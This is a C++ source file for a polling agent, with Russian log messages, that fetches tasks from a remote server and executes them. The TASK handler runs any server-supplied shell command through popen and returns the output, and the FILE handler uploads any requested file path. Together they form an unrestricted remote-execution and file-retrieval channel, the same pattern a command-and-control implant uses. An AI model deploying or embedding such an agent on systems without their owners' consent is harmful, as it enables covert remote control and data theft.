#include "agent.h"
#include <iostream>
#include <thread>
#include <fstream>
#include <sstream>
#include <cstdio>
#include <array>
#include <optional>
#include <vector>

static std::string unescape_json(const std::string& s) {
    std::string result;
    result.reserve(s.size());
    for (size_t i = 0; i < s.size(); ++i) {
        if (s[i] == '\\' && i + 1 < s.size()) {
            char next = s[i+1];
            if (next == '"' || next == '\\') {
                result += next;
                ++i;
                continue;
            }
        }
        result += s[i];
    }
    return result;
}

static std::string extract_json_object(const std::string& s) {
    size_t start = s.find('{');
    if (start == std::string::npos) return "";
    int brace_count = 0;
    for (size_t i = start; i < s.size(); ++i) {
        if (s[i] == '{') brace_count++;
        else if (s[i] == '}') brace_count--;
        if (brace_count == 0) {
            return s.substr(start, i - start + 1);
        }
    }
    return "";
}

static std::string clean_options(const std::string& raw) {
    std::string unescaped = unescape_json(raw);
    std::string obj = extract_json_object(unescaped);
    if (!obj.empty()) return obj;
    return unescaped;
}

static std::optional<int> extract_interval_from_options(const std::string& options_str) {
    std::string cleaned = clean_options(options_str);
    const std::vector<std::string> keys = {"interval", "INTERVAL"};
    for (const auto& key : keys) {
        size_t key_pos = cleaned.find("\"" + key + "\"");
        if (key_pos != std::string::npos) {
            size_t colon = cleaned.find(':', key_pos);
            if (colon != std::string::npos) {
                size_t val_start = colon + 1;
                while (val_start < cleaned.size() && (cleaned[val_start] == ' ' || cleaned[val_start] == '\t')) {
                    val_start++;
                }
                if (val_start < cleaned.size()) {
                    std::string interval_str;
                    if (cleaned[val_start] == '"') {
                        size_t start = val_start + 1;
                        size_t end = cleaned.find('"', start);
                        if (end != std::string::npos) {
                            interval_str = cleaned.substr(start, end - start);
                        }
                    } else {
                        size_t end = val_start;
                        while (end < cleaned.size() && cleaned[end] != ',' && cleaned[end] != '}' && cleaned[end] != ' ' && cleaned[end] != '\r' && cleaned[end] != '\n') {
                            end++;
                        }
                        interval_str = cleaned.substr(val_start, end - val_start);
                    }
                    try {
                        if (!interval_str.empty()) return std::stoi(interval_str);
                    } catch(...) {}
                }
            }
        }
    }
    return std::nullopt;
}

static std::string read_file(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return "";
    std::ostringstream ss;
    ss << f.rdbuf();
    return ss.str();
}

static bool write_file(const std::string& path, const std::string& content) {
    std::ofstream f(path, std::ios::binary);
    if (!f) return false;
    f << content;
    return true;
}

static std::string run_command(const std::string& cmd) {
    std::array<char, 512> buf;
    std::string result;
#ifdef _WIN32
    FILE* pipe = _popen(cmd.c_str(), "r");
#else
    FILE* pipe = popen(cmd.c_str(), "r");
#endif
    if (!pipe) return "popen failed";
    while (fgets(buf.data(), buf.size(), pipe) != nullptr)
        result += buf.data();
#ifdef _WIN32
    _pclose(pipe);
#else
    pclose(pipe);
#endif
    return result;
}

static int request_task(Task& out_task) {
    std::string url  = Config::BASE_URL + "/wa_task/";
    std::string body = Json::build({
        {"UID",         Config::AGENT_UID},
        {"descr",       Config::AGENT_DESC},
        {"access_code", g_state.access_code}
    });

    try {
        auto resp = Http::post(url, body);

        if (resp.status_code != 200) {
            Logger::err("HTTP ошибка при запросе задания: " + std::to_string(resp.status_code));
            return -99;
        }

        auto code_opt = Json::get(resp.body, "code_responce");
        if (!code_opt) {
            Logger::err("Не удалось разобрать ответ: " + resp.body);
            return -99;
        }

        int code = std::stoi(*code_opt);

        if (code == 1) {
            out_task.task_code  = Json::get(resp.body, "task_code") .value_or("");
            out_task.session_id = Json::get(resp.body, "session_id").value_or("");
            out_task.status     = Json::get(resp.body, "status")    .value_or("");

            std::string options_raw;
            size_t opt_start = resp.body.find("\"options\":\"");
            if (opt_start != std::string::npos) {
                opt_start += 11;
                size_t opt_end = resp.body.find("\",\"session_id\"", opt_start);
                if (opt_end != std::string::npos) {
                    options_raw = resp.body.substr(opt_start, opt_end - opt_start);
                }
            }
            out_task.options = options_raw;
            Logger::info("Получено задание: task_code=" + out_task.task_code + " session_id=" + out_task.session_id);
            return 1;
        } else if (code == 0) {
            return 0;
        } else if (code == -2) {
            Logger::err("Неверный код доступа. Потребуется перерегистрация.");
            return -2;
        } else {
            Logger::warn("Неожиданный ответ сервера: " + resp.body);
            return -99;
        }
    } catch (const std::exception& e) {
        Logger::err(std::string("Сетевая ошибка: ") + e.what());
        return -99;
    }
}

static void handle_conf(const Task& task) {
    Logger::info("[CONF] Начинаю обработку, session_id=" + task.session_id);

    std::string opts = task.options;
    size_t pos = 0;
    while ((pos = opts.find("\\\"", pos)) != std::string::npos) {
        opts.replace(pos, 2, "\"");
        pos += 1;
    }

    std::string cleaned = extract_json_object(opts);
    if (cleaned.empty()) cleaned = opts;

    std::string key;
    std::string value;

    size_t key_pos = cleaned.find("\"key\"");
    if (key_pos != std::string::npos) {
        size_t colon = cleaned.find(':', key_pos);
        if (colon != std::string::npos) {
            size_t start = cleaned.find('"', colon);
            if (start != std::string::npos) {
                size_t end = cleaned.find('"', start + 1);
                if (end != std::string::npos) {
                    key = cleaned.substr(start + 1, end - start - 1);
                }
            }
        }
    }

    size_t val_pos = cleaned.find("\"value\"");
    if (val_pos != std::string::npos) {
        size_t colon = cleaned.find(':', val_pos);
        if (colon != std::string::npos) {
            size_t start = cleaned.find('"', colon);
            if (start != std::string::npos) {
                size_t end = cleaned.find('"', start + 1);
                if (end != std::string::npos) {
                    value = cleaned.substr(start + 1, end - start - 1);
                }
            }
        }
    } else {
        val_pos = cleaned.find("\"val\"");
        if (val_pos != std::string::npos) {
            size_t colon = cleaned.find(':', val_pos);
            if (colon != std::string::npos) {
                size_t bracket = cleaned.find('[', colon);
                if (bracket != std::string::npos) {
                    size_t start = cleaned.find('"', bracket);
                    if (start != std::string::npos) {
                        size_t end = cleaned.find('"', start + 1);
                        if (end != std::string::npos) {
                            value = cleaned.substr(start + 1, end - start - 1);
                        }
                    }
                }
            }
        }
    }

    if (key.empty() || value.empty()) {
        Logger::warn("[CONF] Не удалось извлечь структуру данных конфигурации");
        send_result(task.session_id, -1, "invalid options structure", {});
        return;
    }

    std::string cfg_content = read_file(CONFIG_FILE_PATH);
    if (cfg_content.empty()) {
        cfg_content = "{\"uid\":\"" + Config::AGENT_UID + "\",\"description\":\"" + Config::AGENT_DESC + "\",\"poll_interval_sec\":" + std::to_string(Config::POLL_INTERVAL_SEC) + "}";
    }

    std::string search_key = "\"" + key + "\"";
    size_t p = cfg_content.find(search_key);
    if (p != std::string::npos) {
        size_t colon = cfg_content.find(':', p + search_key.size());
        if (colon != std::string::npos) {
            size_t val_start = colon + 1;
            while (val_start < cfg_content.size() && cfg_content[val_start] == ' ') val_start++;
            size_t val_end = val_start;
            bool is_string = (cfg_content[val_start] == '"');
            if (is_string) {
                val_end = cfg_content.find('"', val_start + 1) + 1;
                cfg_content.replace(val_start, val_end - val_start, "\"" + value + "\"");
            } else {
                while (val_end < cfg_content.size() && cfg_content[val_end] != ',' && cfg_content[val_end] != '}') val_end++;
                cfg_content.replace(val_start, val_end - val_start, value);
            }
        }
    } else {
        size_t brace = cfg_content.rfind('}');
        if (brace != std::string::npos) {
            std::string insert = ",\"" + key + "\":\"" + value + "\"";
            cfg_content.insert(brace, insert);
        }
    }

    if (!write_file(CONFIG_FILE_PATH, cfg_content)) {
        Logger::err("[CONF] Критическая ошибка записи конфига");
        send_result(task.session_id, -1, "failed to write config", {});
        return;
    }

    if (key == "poll_interval_sec") {
        try {
            int new_interval = std::stoi(value);
            if (new_interval > 0) {
                Config::POLL_INTERVAL_SEC = new_interval;
                Logger::info("[CONF] Синхронизирован новый интервал опроса: " + std::to_string(new_interval));
            }
        } catch (...) {}
    }

    Logger::info("[CONF] Параметр " + key + " успешно обновлен.");
    send_result(task.session_id, 0, "config updated: " + key + " = " + value, {});
}

static void handle_file(const Task& task) {
    Logger::info("[FILE] Начинаю обработку файла, session_id=" + task.session_id);

    std::string cleaned = clean_options(task.options);
    std::string filename;
    size_t key_pos = cleaned.find("\"filename\"");
    if (key_pos != std::string::npos) {
        size_t colon = cleaned.find(':', key_pos);
        if (colon != std::string::npos) {
            size_t start = cleaned.find('"', colon);
            if (start != std::string::npos) {
                size_t end = cleaned.find('"', start + 1);
                if (end != std::string::npos) filename = cleaned.substr(start + 1, end - start - 1);
            }
        }
    }

    // Если сервер просит config.json без указания папки, подставляем наш глобальный путь
    if (filename.empty() || filename == "config.json") {
        filename = CONFIG_FILE_PATH;
    }

    std::ifstream f(filename);
    if (!f.good()) {
        Logger::err("[FILE] Запрошенный файл не найден по пути: " + filename);
        send_result(task.session_id, -1, "file not found: " + filename, {});
        return;
    }
    f.close();

    Logger::info("[FILE] Выполняю отправку файла: " + filename);
    send_result(task.session_id, 0, "file attached", {filename});
}

static void handle_task(const Task& task) {
    Logger::info("[TASK] Запуск команды терминала, session_id=" + task.session_id);

    std::string cleaned = clean_options(task.options);
    std::string command;
    size_t key_pos = cleaned.find("\"command\"");
    if (key_pos != std::string::npos) {
        size_t colon = cleaned.find(':', key_pos);
        if (colon != std::string::npos) {
            size_t start = cleaned.find('"', colon);
            if (start != std::string::npos) {
                size_t end = cleaned.find('"', start + 1);
                if (end != std::string::npos) command = cleaned.substr(start + 1, end - start - 1);
            }
        }
    }

    if (command.empty()) {
        Logger::warn("[TASK] Отсутствует поле command");
        send_result(task.session_id, -1, "no command in options", {});
        return;
    }

    Logger::info("[TASK] Исполнение команды: " + command);
    std::string output = run_command(command);
    if (output.empty()) output = "(no output)";
    if (output.size() > 2000) output = output.substr(0, 2000) + "...(truncated)";

    Logger::info("[TASK] Вывод команды: " + output);
    send_result(task.session_id, 0, output, {});
}

static void handle_timeout(const Task& task) {
    Logger::info("[TIMEOUT] Корректировка таймера, session_id=" + task.session_id);
    auto parsed_interval = extract_interval_from_options(task.options);

    if (!parsed_interval) {
        Logger::warn("[TIMEOUT] Поле interval не найдено или имеет неверный формат");
        send_result(task.session_id, -1, "no interval in options", {});
        return;
    }

    int new_interval = *parsed_interval;
    if (new_interval <= 0) {
        send_result(task.session_id, -1, "interval must be > 0", {});
        return;
    }

    Config::POLL_INTERVAL_SEC = new_interval;
    Logger::info("[TIMEOUT] Интервал опроса успешно переключен на " + std::to_string(new_interval) + " сек.");
    send_result(task.session_id, 0, "interval changed to " + std::to_string(new_interval), {});
}

using TaskHandler = std::function<void(const Task&)>;
static const std::map<std::string, TaskHandler> HANDLERS = {
    { "CONF",    handle_conf    },
    { "FILE",    handle_file    },
    { "TASK",    handle_task    },
    { "TIMEOUT", handle_timeout },
};

static void execute_task(const Task& task) {
    auto it = HANDLERS.find(task.task_code);
    if (it != HANDLERS.end()) {
        it->second(task);
    } else {
        Logger::warn("Неподдерживаемый тип задания: '" + task.task_code + "'");
        send_result(task.session_id, -1, "unknown task_code: " + task.task_code, {});
    }
}

static bool try_reregister() {
    g_state.reset();
    for (int attempt = 1; attempt <= Config::MAX_REG_RETRIES; ++attempt) {
        Logger::info("Повторный запрос сессии: попытка " + std::to_string(attempt) + "/" + std::to_string(Config::MAX_REG_RETRIES));
        if (register_agent()) return true;
        int backoff = attempt * 5;
        std::this_thread::sleep_for(std::chrono::seconds(backoff));
    }
    return false;
}

void polling_loop() {
    Logger::info("Цикл опроса запущен. Интервал по умолчанию: " + std::to_string(Config::POLL_INTERVAL_SEC) + " сек.");

    while (true) {
        Task task;
        int result = request_task(task);

        if (result == 1) {
            execute_task(task);
        } else if (result == -2) {
            if (!try_reregister()) {
                Logger::crit("Не удалось восстановить сессию. Завершение работы.");
                return;
            }
            continue;
        }

        // Вывод лога перед уходом в сон
        Logger::info("Следующий опрос сервера произойдет через " + std::to_string(Config::POLL_INTERVAL_SEC) + " сек.");
        std::this_thread::sleep_for(std::chrono::seconds(Config::POLL_INTERVAL_SEC));
    }
}
